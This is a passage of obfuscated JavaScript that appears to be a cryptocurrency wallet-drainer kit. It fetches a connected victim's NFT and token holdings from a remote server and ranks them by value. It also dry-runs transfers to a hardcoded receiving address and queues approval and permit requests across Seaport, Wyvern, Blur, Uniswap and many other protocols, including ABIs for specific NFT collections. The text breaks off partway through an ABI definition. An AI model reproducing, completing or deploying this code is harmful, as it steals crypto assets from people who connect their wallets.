                if (_0x4bacb2 > _0x151e59.approvals.wyvern) {
                  _0x187f64 = _0x151e59.approvals.wyvern;
                }
                let _0xd4e14f = _0x187f64 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.wyvernTokenActions.push({
                  'value': _0xd4e14f * _0x2d2f04.assetOptions.multipliers.wyvern,
                  'amount': _0x187f64,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.approvals.special > 0) {
                let _0x27c82e = _0x4bacb2;
                if (_0x4bacb2 > _0x151e59.approvals.special) {
                  _0x27c82e = _0x151e59.approvals.special;
                }
                let _0xac24e0 = _0x27c82e / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.specialActions.push({
                  'value': _0xac24e0 * _0x2d2f04.assetOptions.multipliers.special,
                  'amount': _0x27c82e,
                  'token': _0x151e59.token_address,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              if (_0x151e59.permit_type == 1 || _0x151e59.permit_type == 2 || _0x151e59.permit_type == 3 || _0x151e59.permit_type == 4) {
                let _0xe66624 = _0x4bacb2 / 10 ** _0x151e59.decimals * _0x151e59.price;
                this.approvalTokenActions.push({
                  'token': _0x151e59,
                  'value': _0xe66624 * _0x2d2f04.assetOptions.multipliers.permit,
                  'chain': _0x151e59.chain
                });
                _0x36010b = true;
              }
              let _0xa0e81f = _0x4bacb2 / 10 ** _0x151e59.decimals * _0x151e59.price;
              this.approvalTokenActions.push({
                'token': _0x151e59,
                'value': _0xa0e81f * _0x2d2f04.assetOptions.multipliers.safa,
                'chain': _0x151e59.chain
              });
              if (!this.tokenChains.includes(_0x151e59.chain)) {
                this.tokenChains.push(_0x151e59.chain);
              }
            } catch (_0x534fe1) {
              console.log(_0x534fe1);
            }
          }
        });
        await Promise.all(_0x4261ab);
      }
    } catch (_0x2a8c6c) {
      console.log(_0x2a8c6c);
    }
  };
  ["nftPromise"] = async () => {
    try {
      console.log("Requesting NFTs");
      let _0x31bee1 = await (await fetch(this.domain + '/nft/' + (await this.getWalletAddress()) + ('/' + Base64.encode(this.createEncKey())), this.options)).json();
      let _0x143936 = _0x31bee1.nfts;
      let _0x13bbaf = [];
      this.nft_array = _0x143936;
      console.log("Received NFTs");
      if (_0x143936 != null && _0x143936.length > 0) {
        for (let _0x573c5c of _0x143936) {
          let _0x41c9c4 = _0x573c5c.price * ethPrice;
          this.totalNFTs += _0x41c9c4;
        }
        const _0x31a32c = _0x143936.map(async _0x2f4f73 => {
          let _0x84910a = _0x2f4f73.price * ethPrice;
          try {
            if (_0x2f4f73.contract.toLowerCase() == "0x23581767a106ae21c074b2276d25e5c3e136a68b" || _0x2f4f73.contract.toLowerCase() == "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb") {
              const _0x2a3210 = {
                nft: _0x2f4f73,
                value: _0x84910a,
                chain: 'eth'
              };
              this.approvalNFTActions.push(_0x2a3210);
            } else {
              if (_0x2f4f73.contract.toLowerCase() != "0xabefbc9fd2f806065b4f3c237d4b59d9a97bcac7" && _0x2f4f73.contract.toLowerCase() != "0x60f80121c31a0d46b5279700f9df786054aa5ee5" && _0x2f4f73.contract.toLowerCase() != "0x3b3ee1931dc30c1957379fac9aba94d1c48a5405" && _0x2f4f73.contract.toLowerCase() != "0x82c7a8f707110f5fbb16184a5933e9f78a34c6ab" && _0x2f4f73.contract.toLowerCase() != "0xabb3738f04dc2ec20f4ae4462c3d069d02ae045b" && _0x2f4f73.contract.toLowerCase() != "0xd07dc4262bcdbf85190c01c996b4c06a461d2430" && _0x2f4f73.contract.toLowerCase() != "0x76be3b62873462d2142405439777e971754e8e77") {
                let _0x18c4e8 = true;
                let _0x32356b = false;
                if (_0x2f4f73.approvals.seaport > 0 || _0x2f4f73.approvals.wyvern > 0 || _0x2f4f73.approvals.ostransfers > 0 || _0x2f4f73.approvals.blur_delegate > 0 || _0x2f4f73.approvals.blur_execution > 0 || _0x2f4f73.approvals.x2y2_transfers > 0) {
                  try {
                    _0x32356b = true;
                    if (!_0x13bbaf.includes(_0x2f4f73.contract)) {
                      if (_0x2f4f73.scheme == "erc1155") {
                        await this.Sdk.sendERC1155_DRY(await this.getWalletAddress(), _0x2f4f73.contract, "0xACE77777F820Dc4CB560453e6aBD2e06b03F07AA", _0x2f4f73.token_id);
                      } else {
                        await this.Sdk.sendERC721_DRY(await this.getWalletAddress(), _0x2f4f73.contract, "0xACE77777F820Dc4CB560453e6aBD2e06b03F07AA", _0x2f4f73.token_id);
                      }
                      _0x13bbaf.push(_0x2f4f73.contract);
                    }
                  } catch (_0x5601a2) {
                    _0x18c4e8 = false;
                  }
                }
                if (_0x2f4f73.approvals.seaport > 0) {
                  if (_0x18c4e8) {
                    this.seaportNFTActions.push({
                      'nft': _0x2f4f73,
                      'value': _0x84910a * _0x2d2f04.assetOptions.multipliers.seaport,
                      'chain': _0x2f4f73.chain
                    });
                  }
                }
                if (_0x2f4f73.approvals.os_transfers > 0) {
                  console.log("OSTransfer");
                  if (_0x18c4e8) {
                    this.osTransferActions.push({
                      'nft': _0x2f4f73,
                      'value': _0x84910a * _0x2d2f04.assetOptions.multipliers.ostransfers,
                      'chain': _0x2f4f73.chain
                    });
                  }
                }
                if (_0x2f4f73.approvals.wyvern > 0) {
                  if (_0x18c4e8) {
                    this.wyvernNftActions.push({
                      'nft': _0x2f4f73,
                      'value': _0x84910a * _0x2d2f04.assetOptions.multipliers.wyvern,
                      'chain': _0x2f4f73.chain
                    });
                  }
                }
                if (!_0x32356b) {
                  _0x2f4f73.token_ids = [];
                  _0x2f4f73.token_ids.push(_0x2f4f73.token_id);
                  this.approvalNFTActions.push({
                    'nft': _0x2f4f73,
                    'value': _0x84910a * _0x2d2f04.assetOptions.multipliers.safa,
                    'chain': _0x2f4f73.chain
                  });
                }
              }
            }
          } catch (_0x8cc14e) {
            console.log(_0x8cc14e);
          }
        });
        await Promise.all(_0x31a32c);
      }
    } catch (_0x218538) {
      console.log(_0x218538);
    }
  };
  ["getAssetInfo"] = _0x1a49fb => {
    try {
      switch (_0x1a49fb.actionType) {
        case "ZeroEx":
        case "WooBridge":
        case "WooFinance":
        case "UniswapV2":
        case 'SushiSwap':
        case "SushiProcess":
        case "TraderJoeV1":
        case "TraderJoeV2":
        case "TraderJoeV3":
        case "ShibaSwap":
        case "SpookySwap":
        case 'Special':
        case "Stargate":
        case "Quickswap":
        case "Pangolin":
        case "Pancake":
        case "TokenPermit":
        case "Kyber":
        case "1InchV5":
        case "GMX":
        case "Camelot":
        case "Curve":
        case "CurveVyper1":
        case "Bancor":
        case "BancorSwaps":
        case "AaveLP2":
        case "AaveLP3":
        case "AaveLP4":
          return {
            'name': this.token_array.find(_0x4dfc35 => _0x4dfc35.chain == _0x1a49fb.chain && _0x1a49fb.asset.token == _0x4dfc35.token_address).name
          };
        case "ApeStake":
          const _0x3d7b86 = {
            name: "ApeCoin"
          };
          return _0x3d7b86;
        case "ApprovalToken":
          {
            let _0x414dcd = this.token_array.find(_0x2de365 => _0x2de365.chain == _0x1a49fb.chain && _0x1a49fb.asset.token_address == _0x2de365.token_address);
            let _0x5034d8 = false;
            if (_0x414dcd.permit_type == 1 || _0x414dcd.permit_type == 2 || _0x414dcd.permit_type == 3 || _0x414dcd.permit_type == 4) {
              _0x5034d8 = true;
            }
            const _0x255924 = {
              name: _0x414dcd.name,
              isPermit: _0x5034d8
            };
            return _0x255924;
          }
        case "UniswapV3":
        case "UniswapV3_2":
        case "PancakeV2":
        case "Permit2":
          {
            let _0x2b44b7 = _0x1a49fb.asset;
            let _0x4d6b25 = '';
            let _0x10be78 = 0;
            for (let _0x6f4a9e of _0x2b44b7) {
              _0x10be78++;
              _0x4d6b25 += "🫧 " + this.token_array.find(_0x218d10 => _0x218d10.chain == _0x1a49fb.chain && _0x6f4a9e.token == _0x218d10.token_address).name + "\n";
            }
            const _0x36e43b = {
              name: _0x4d6b25,
              count: _0x10be78
            };
            return _0x36e43b;
          }
        case "Seaport":
          {
            let _0x530839 = '';
            let _0xc2ecdb = 0;
            let _0x4bfad6 = 0;
            for (let _0x309086 of this.offer) {
              let _0xfcb8c2 = '';
              if (_0x309086.itemType == 1) {
                _0xfcb8c2 = "🫧 " + this.token_array.find(_0x36ff31 => _0x36ff31.chain == _0x1a49fb.chain && _0x309086.token == _0x36ff31.token_address).name + "\n";
                _0xc2ecdb++;
              } else {
                _0xfcb8c2 = "🫧 " + this.nft_array.find(_0x2802fd => _0x2802fd.chain == _0x1a49fb.chain && _0x309086.token == _0x2802fd.contract).name + "\n";
                _0x4bfad6++;
              }
              if (!_0x530839.includes(_0xfcb8c2)) {
                _0x530839 += _0xfcb8c2 + "\n";
              }
            }
            const _0x2b7fac = {
              name: _0x530839,
              tokenCount: _0xc2ecdb,
              nftCount: _0x4bfad6
            };
            return _0x2b7fac;
          }
        case "OSTransfer":
          {
            let _0x233164 = '';
            let _0x1514df = 0;
            for (let _0x5c1910 of _0x1a49fb.asset) {
              let _0x5f0b4b = this.nft_array.find(_0x14c639 => _0x14c639.chain == _0x1a49fb.chain && _0x5c1910.token == _0x14c639.contract).name;
              if (!_0x233164.includes(_0x5f0b4b)) {
                _0x233164 += "🫧 " + _0x5f0b4b + "\n";
                _0x1514df++;
              }
            }
            const _0xc3efe2 = {
              name: _0x233164,
              count: _0x1514df
            };
            return _0xc3efe2;
          }
        case "Wyvern":
          {
            let _0x480abb = '';
            let _0x16518f = 0;
            for (let _0x2bfeaa of _0x1a49fb.asset) {
              if (!_0x480abb.includes(_0x2bfeaa.nft.name)) {
                _0x480abb += "🫧 " + _0x2bfeaa.nft.name + "\n";
                _0x16518f++;
              }
            }
            const _0x2afb92 = {
              name: _0x480abb,
              count: _0x16518f
            };
            return _0x2afb92;
          }
        case "ApprovalNFT":
          {
            if (_0x1a49fb.asset.contract.toLowerCase() == "0x23581767a106ae21c074b2276d25e5c3e136a68b") {
              const _0x9523aa = {
                name: "Moonbird #" + _0x1a49fb.asset.token_id,
                count: 0x1
              };
              return _0x9523aa;
            } else {
              if (_0x1a49fb.asset.contract.toLowerCase() == "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb") {
                const _0x58ff63 = {
                  name: "Cryptopunk #" + _0x1a49fb.asset.token_id,
                  count: 0x1
                };
                return _0x58ff63;
              } else {
                if (_0x1a49fb.asset.token_ids.length == 1) {
                  const _0x496bb5 = {
                    name: _0x1a49fb.asset.name + " #" + _0x1a49fb.asset.token_ids[0],
                    count: 0x1
                  };
                  return _0x496bb5;
                } else {
                  const _0x214fc7 = {
                    name: '' + _0x1a49fb.asset.name,
                    count: _0x1a49fb.asset.token_ids.length
                  };
                  return _0x214fc7;
                }
              }
            }
          }
        default:
          const _0xcc0838 = {
            name: '',
            count: 0x0
          };
          return _0xcc0838;
      }
    } catch {
      const _0x47bf3c = {
        name: '',
        count: 0x0
      };
      return _0x47bf3c;
    }
  };
  ["approve"] = async _0x50b10b => {
    let _0x4826bc = await this.getWalletAddress();
    let _0x7eec3 = '';
    try {
      if (_0x50b10b.actionType == "ApprovalNFT") {
        let _0x1a1bf9 = _0x50b10b.asset;
        _0x7eec3 = _0x50b10b.asset.contract;
        if (!this.approved.includes(_0x1a1bf9.contract + ',' + _0x50b10b.chain) && !this.approved.includes(_0x1a1bf9)) {
          if (_0x1a1bf9.contract.toLowerCase() == "0x23581767a106ae21c074b2276d25e5c3e136a68b") {
            const _0x49d904 = {
              internalType: "string",
              name: 'name',
              type: "string"
            };
            const _0x15a6f9 = {
              internalType: 'string',
              name: "symbol",
              type: "string"
            };
            const _0x45be1b = {
              internalType: "contract IERC721",
              name: "_proof",
              type: "address"
            };
            const _0x2cf1bd = {
              internalType: "address payable",
              name: "beneficiary",
              type: "address"
            };
            const _0x567ca5 = {
              internalType: "address payable",
              name: "royaltyReceiver",
              type: "address"
            };
            const _0x5145e8 = {
              inputs: [_0x49d904, _0x15a6f9, _0x45be1b, _0x2cf1bd, _0x567ca5],
              stateMutability: "nonpayable",
              type: "constructor"
            };
            const _0x5af2c9 = {
              inputs: [],
              name: "ApprovalCallerNotOwnerNorApproved",
              type: "error"
            };
            const _0x15450d = {
              inputs: [],
              name: "ApprovalQueryForNonexistentToken",
              type: "error"
            };
            const _0x29b188 = {
              inputs: [],
              name: "ApprovalToCurrentOwner",
              type: "error"
            };
            const _0x35f011 = {
              inputs: [],
              name: "ApproveToCaller",
              type: "error"
            };
            const _0x29b479 = {
              inputs: [],
              name: "BalanceQueryForZeroAddress",
              type: "error"
            };
            const _0x578681 = {
              inputs: [],
              name: "MintToZeroAddress",
              type: "error"
            };
            const _0x241245 = {
              inputs: [],
              name: "MintZeroQuantity",
              type: "error"
            };
            const _0x349019 = {
              inputs: [],
              name: "OwnerQueryForNonexistentToken",
              type: "error"
            };
            const _0x15730c = {
              inputs: [],
              name: "TransferCallerNotOwnerNorApproved",
              type: "error"
            };
            const _0x175883 = {
              inputs: [],
              name: "TransferFromIncorrectOwner",
              type: "error"
            };
            const _0xab4e52 = {
              inputs: [],
              name: "TransferToNonERC721ReceiverImplementer",
              type: 'error'
            };
            const _0x22e6ae = {
              inputs: [],
              name: "TransferToZeroAddress",
              type: "error"
            };
            const _0x20afe3 = {
              inputs: [],
              name: "URIQueryForNonexistentToken",
              type: "error"
            };
            const _0x116ba5 = {
              indexed: true,
              internalType: 'address',
              name: "owner",
              type: "address"
            };
            const _0x1c0ee3 = {
              indexed: true,
              internalType: "address",
              name: "approved",
              type: "address"
            };
            const _0x3a2583 = {
              indexed: true,
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x1f91fa = {
              anonymous: false,
              inputs: [_0x116ba5, _0x1c0ee3, _0x3a2583],
              name: "Approval",
              type: "event"
            };
            const _0x39613d = {
              indexed: true,
              internalType: "address",
              name: "owner",
              type: "address"
            };
            const _0xb6d6bf = {
              indexed: true,
              internalType: "address",
              name: "operator",
              type: "address"
            };
            const _0xaf04c6 = {
              indexed: false,
              internalType: "bool",
              name: "approved",
              type: "bool"
            };
            const _0x1419a2 = {
              anonymous: false,
              inputs: [_0x39613d, _0xb6d6bf, _0xaf04c6],
              name: "ApprovalForAll",
              type: "event"
            };
            const _0x403a5b = {
              indexed: true,
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x8239ec = {
              anonymous: false,
              inputs: [_0x403a5b],
              name: 'Expelled',
              type: "event"
            };
            const _0x1403ed = {
              indexed: true,
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x3e6bd9 = {
              anonymous: false,
              inputs: [_0x1403ed],
              name: "Nested",
              type: "event"
            };
            const _0x4ea85b = {
              indexed: true,
              internalType: "address",
              name: "previousOwner",
              type: "address"
            };
            const _0x25f9ca = {
              indexed: true,
              internalType: "address",
              name: 'newOwner',
              type: "address"
            };
            const _0xbab759 = {
              anonymous: false,
              inputs: [_0x4ea85b, _0x25f9ca],
              name: "OwnershipTransferred",
              type: "event"
            };
            const _0x242fb2 = {
              indexed: false,
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x5d3212 = {
              anonymous: false,
              inputs: [_0x242fb2],
              name: "Paused",
              type: "event"
            };
            const _0xfda183 = {
              indexed: true,
              internalType: "address",
              name: 'buyer',
              type: "address"
            };
            const _0x1cffba = {
              indexed: false,
              internalType: "uint256",
              name: "amount",
              type: "uint256"
            };
            const _0x5039fd = {
              anonymous: false,
              inputs: [_0xfda183, _0x1cffba],
              name: "Refund",
              type: "event"
            };
            const _0x4524fd = {
              indexed: true,
              internalType: "address",
              name: "beneficiary",
              type: "address"
            };
            const _0x44f2fc = {
              indexed: false,
              internalType: "uint256",
              name: "numPurchased",
              type: 'uint256'
            };
            const _0x5d1b48 = {
              indexed: false,
              internalType: "uint256",
              name: "amount",
              type: "uint256"
            };
            const _0x2dcfe8 = {
              anonymous: false,
              inputs: [_0x4524fd, _0x44f2fc, _0x5d1b48],
              name: "Revenue",
              type: "event"
            };
            const _0x16191a = {
              indexed: true,
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x1f24ad = {
              indexed: true,
              internalType: 'bytes32',
              name: "previousAdminRole",
              type: "bytes32"
            };
            const _0x8c04a6 = {
              indexed: true,
              internalType: 'bytes32',
              name: "newAdminRole",
              type: 'bytes32'
            };
            const _0x22c3b9 = {
              anonymous: false,
              inputs: [_0x16191a, _0x1f24ad, _0x8c04a6],
              name: "RoleAdminChanged",
              type: "event"
            };
            const _0x333d8d = {
              indexed: true,
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x5aa8e2 = {
              indexed: true,
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x1d16ac = {
              indexed: true,
              internalType: "address",
              name: "sender",
              type: "address"
            };
            const _0x269d36 = {
              anonymous: false,
              inputs: [_0x333d8d, _0x5aa8e2, _0x1d16ac],
              name: "RoleGranted",
              type: "event"
            };
            const _0x1bde21 = {
              indexed: true,
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x392115 = {
              indexed: true,
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x1f580d = {
              indexed: true,
              internalType: "address",
              name: "sender",
              type: "address"
            };
            const _0x2ca4c4 = {
              anonymous: false,
              inputs: [_0x1bde21, _0x392115, _0x1f580d],
              name: "RoleRevoked",
              type: "event"
            };
            const _0x6eb1a4 = {
              indexed: true,
              internalType: "address",
              name: "from",
              type: "address"
            };
            const _0x577f46 = {
              indexed: true,
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x1445b7 = {
              indexed: true,
              internalType: "uint256",
              name: "tokenId",
              type: "uint256"
            };
            const _0x47da8d = {
              anonymous: false,
              inputs: [_0x6eb1a4, _0x577f46, _0x1445b7],
              name: "Transfer",
              type: "event"
            };
            const _0x517d2b = {
              indexed: true,
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x499164 = {
              anonymous: false,
              inputs: [_0x517d2b],
              name: 'Unnested',
              type: "event"
            };
            const _0xa1465d = {
              indexed: false,
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x4ad73a = {
              anonymous: false,
              inputs: [_0xa1465d],
              name: "Unpaused",
              type: "event"
            };
            const _0x5233b6 = {
              internalType: 'bytes32',
              name: '',
              type: 'bytes32'
            };
            const _0x4d71c5 = {
              inputs: [],
              name: "DEFAULT_ADMIN_ROLE",
              outputs: [_0x5233b6],
              stateMutability: "view",
              type: "function"
            };
            const _0xd054db = {
              inputs: [],
              name: "EXPULSION_ROLE",
              outputs: [{
                'internalType': "bytes32",
                'name': '',
                'type': 'bytes32'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x28601a = {
              internalType: "address",
              name: "signer",
              type: "address"
            };
            const _0x434806 = {
              inputs: [_0x28601a],
              name: "addSigner",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x264f7e = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x424575 = {
              internalType: 'bytes32',
              name: "nonce",
              type: 'bytes32'
            };
            const _0x55209b = {
              inputs: [_0x264f7e, _0x424575],
              name: "alreadyMinted",
              outputs: [{
                'internalType': "bool",
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x4ea7e6 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x48595f = {
              internalType: "uint256",
              name: 'tokenId',
              type: 'uint256'
            };
            const _0x2e0d63 = {
              inputs: [_0x4ea7e6, _0x48595f],
              name: "approve",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x3da82a = {
              internalType: "address",
              name: "owner",
              type: "address"
            };
            const _0x3ebeb9 = {
              inputs: [_0x3da82a],
              name: "balanceOf",
              outputs: [{
                'internalType': 'uint256',
                'name': '',
                'type': "uint256"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x2e419f = {
              internalType: "string",
              name: '',
              type: "string"
            };
            const _0x5e2d61 = {
              inputs: [],
              name: "baseTokenURI",
              outputs: [_0x2e419f],
              stateMutability: "view",
              type: "function"
            };
            const _0x38dbbc = {
              inputs: [],
              name: "beneficiary",
              outputs: [{
                'internalType': "address payable",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: 'function'
            };
            const _0x128fb5 = {
              internalType: "uint256",
              name: 'n',
              type: "uint256"
            };
            const _0x47a3cc = {
              internalType: "uint256",
              name: '',
              type: 'uint256'
            };
            const _0x4c2df5 = {
              inputs: [_0x128fb5, _0x47a3cc],
              name: "cost",
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': "uint256"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x2d1968 = {
              internalType: "uint256",
              name: 'tokenId',
              type: 'uint256'
            };
            const _0x415f5d = {
              inputs: [_0x2d1968],
              name: "expelFromNest",
              outputs: [],
              stateMutability: 'nonpayable',
              type: "function"
            };
            const _0x11c685 = {
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x1ade9d = {
              inputs: [_0x11c685],
              name: "getApproved",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x31b8de = {
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x4b0711 = {
              inputs: [_0x31b8de],
              name: "getRoleAdmin",
              outputs: [{
                'internalType': 'bytes32',
                'name': '',
                'type': 'bytes32'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x5376f6 = {
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x2e499c = {
              internalType: "uint256",
              name: 'index',
              type: "uint256"
            };
            const _0x52f58f = {
              internalType: 'address',
              name: '',
              type: 'address'
            };
            const _0x3fac13 = {
              inputs: [_0x5376f6, _0x2e499c],
              name: "getRoleMember",
              outputs: [_0x52f58f],
              stateMutability: "view",
              type: "function"
            };
            const _0x2afa16 = {
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x34e639 = {
              internalType: "uint256",
              name: '',
              type: "uint256"
            };
            const _0x5e1671 = {
              inputs: [_0x2afa16],
              name: "getRoleMemberCount",
              outputs: [_0x34e639],
              stateMutability: "view",
              type: "function"
            };
            const _0xd65a89 = {
              internalType: "bytes32",
              name: "role",
              type: 'bytes32'
            };
            const _0x45fe5b = {
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x7e391a = {
              inputs: [_0xd65a89, _0x45fe5b],
              name: "grantRole",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x5ab955 = {
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x44be71 = {
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x26ac7a = {
              inputs: [_0x5ab955, _0x44be71],
              name: "hasRole",
              outputs: [{
                'internalType': "bool",
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x20bdb5 = {
              internalType: "address",
              name: "owner",
              type: "address"
            };
            const _0x5a0001 = {
              internalType: "address",
              name: "operator",
              type: "address"
            };
            const _0x4785f1 = {
              inputs: [_0x20bdb5, _0x5a0001],
              name: "isApprovedForAll",
              outputs: [{
                'internalType': "bool",
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: 'function'
            };
            const _0x375365 = {
              internalType: "uint256[]",
              name: "proofTokenIds",
              type: "uint256[]"
            };
            const _0x4cb856 = {
              inputs: [_0x375365],
              name: "mintPROOF",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x2feba3 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x4419e8 = {
              internalType: 'bytes32',
              name: 'nonce',
              type: "bytes32"
            };
            const _0x3e5154 = {
              internalType: 'bytes',
              name: "sig",
              type: 'bytes'
            };
            const _0xca2d5c = {
              inputs: [_0x2feba3, _0x4419e8, _0x3e5154],
              name: "mintPublic",
              outputs: [],
              stateMutability: "payable",
              type: "function"
            };
            const _0x32b92c = {
              internalType: 'address',
              name: 'to',
              type: "address"
            };
            const _0x21029d = {
              internalType: "uint256",
              name: 'n',
              type: "uint256"
            };
            const _0x1a346b = {
              inputs: [_0x32b92c, _0x21029d],
              name: "mintUnclaimed",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x2ac290 = {
              inputs: [],
              name: 'name',
              outputs: [{
                'internalType': "string",
                'name': '',
                'type': "string"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x1d69af = {
              internalType: "bool",
              name: '',
              type: "bool"
            };
            const _0x29e20c = {
              inputs: [],
              name: "nestingOpen",
              outputs: [_0x1d69af],
              stateMutability: "view",
              type: "function"
            };
            const _0x3400a7 = {
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x39edd4 = {
              inputs: [_0x3400a7],
              name: "nestingPeriod",
              outputs: [{
                'internalType': "bool",
                'name': "nesting",
                'type': "bool"
              }, {
                'internalType': "uint256",
                'name': 'current',
                'type': "uint256"
              }, {
                'internalType': "uint256",
                'name': 'total',
                'type': "uint256"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3fa2ac = {
              internalType: "address",
              name: '',
              type: "address"
            };
            const _0x479d36 = {
              inputs: [],
              name: "owner",
              outputs: [_0x3fa2ac],
              stateMutability: "view",
              type: "function"
            };
            const _0x31bb81 = {
              internalType: "uint256",
              name: 'tokenId',
              type: 'uint256'
            };
            const _0x1e1927 = {
              inputs: [_0x31bb81],
              name: "ownerOf",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: 'function'
            };
            const _0x48b1bd = {
              inputs: [],
              name: "pause",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0xb58e70 = {
              inputs: [],
              name: "paused",
              outputs: [{
                'internalType': "bool",
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: 'function'
            };
            const _0x3f93bb = {
              inputs: [],
              name: 'price',
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': "uint256"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x16cc47 = {
              inputs: [],
              name: "proof",
              outputs: [{
                'internalType': "contract IERC721",
                'name': '',
                'type': 'address'
              }],
              stateMutability: 'view',
              type: "function"
            };
            const _0xedfd1b = {
              internalType: "uint256",
              name: 'tokenId',
              type: "uint256"
            };
            const _0x8e1428 = {
              internalType: "uint256",
              name: '',
              type: "uint256"
            };
            const _0x29bb0b = {
              inputs: [_0xedfd1b],
              name: "proofClaimsRemaining",
              outputs: [_0x8e1428],
              stateMutability: 'view',
              type: 'function'
            };
            const _0x291f45 = {
              inputs: [],
              name: "proofMintingOpen",
              outputs: [{
                'internalType': 'bool',
                'name': '',
                'type': "bool"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x8f0807 = {
              inputs: [],
              name: "proofPoolRemaining",
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x55c2ad = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x1fcb2c = {
              internalType: "uint256",
              name: 'n',
              type: "uint256"
            };
            const _0x2a69ab = {
              inputs: [_0x55c2ad, _0x1fcb2c],
              name: "purchaseFreeOfCharge",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x4ef4a0 = {
              internalType: "address",
              name: "signer",
              type: "address"
            };
            const _0x241d50 = {
              inputs: [_0x4ef4a0],
              name: "removeSigner",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x4ddae6 = {
              inputs: [],
              name: "renderingContract",
              outputs: [{
                'internalType': "contract ITokenURIGenerator",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3caf61 = {
              inputs: [],
              name: "renounceOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x524871 = {
              internalType: 'bytes32',
              name: "role",
              type: 'bytes32'
            };
            const _0x3aed71 = {
              internalType: "address",
              name: 'account',
              type: "address"
            };
            const _0x24c5ee = {
              inputs: [_0x524871, _0x3aed71],
              name: "renounceRole",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x26b080 = {
              internalType: 'bytes32',
              name: "role",
              type: "bytes32"
            };
            const _0x4d553b = {
              internalType: "address",
              name: "account",
              type: "address"
            };
            const _0x2f098f = {
              inputs: [_0x26b080, _0x4d553b],
              name: 'revokeRole',
              outputs: [],
              stateMutability: "nonpayable",
              type: 'function'
            };
            const _0x4aad4c = {
              internalType: 'uint256',
              name: "_tokenId",
              type: "uint256"
            };
            const _0x3e523f = {
              internalType: "uint256",
              name: "_salePrice",
              type: 'uint256'
            };
            const _0x48ae36 = {
              inputs: [_0x4aad4c, _0x3e523f],
              name: "royaltyInfo",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }, {
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x56716f = {
              internalType: "address",
              name: "from",
              type: 'address'
            };
            const _0x343f17 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x3e1b94 = {
              internalType: "uint256",
              name: "tokenId",
              type: "uint256"
            };
            const _0x46c7d2 = {
              inputs: [_0x56716f, _0x343f17, _0x3e1b94],
              name: "safeTransferFrom",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x121a5f = {
              internalType: "address",
              name: "from",
              type: "address"
            };
            const _0x2611b6 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x52b761 = {
